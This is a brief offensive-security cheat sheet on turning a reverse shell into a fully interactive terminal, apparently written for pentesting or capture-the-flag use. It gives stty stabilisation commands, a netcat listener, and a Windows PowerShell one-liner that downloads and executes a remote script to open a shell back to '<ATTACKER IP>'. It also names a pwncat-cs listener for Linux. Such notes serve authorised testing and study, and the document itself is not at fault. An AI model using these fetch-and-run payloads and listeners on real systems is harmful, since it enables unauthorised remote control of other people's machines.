# How to upgrade a reverse shell to a fully interactive stty:

A good resource to pimp your reverse shells is [revshells.com](https://www.revshells.com/) 

## The old fashion

```bash
ctrl+z
echo $TERM && tput lines && tput cols

# for bash
stty raw -echo
fg

# for zsh
stty raw -echo; fg

reset
export SHELL=bash
export TERM=xterm-256color
stty rows <num> columns <cols>
```

## Other methods

Theses handler will automatically create a fully interactive pty when the connection is received

### On Windows

Use [ConPty](https://github.com/antonioCoco/ConPtyShell)

The listener:
```powershell
stty raw -echo; (stty size; cat) | nc -lvnp <PORT>
```

The payload
```powershell
IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell <ATTACKER IP> <PORT>
```

### On linux

Use [pwncat-cs](https://github.com/calebstewart/pwncat)

The listener:
```sh
pwncat-cs -lp <PORT>
```

You can use any classic payload on the target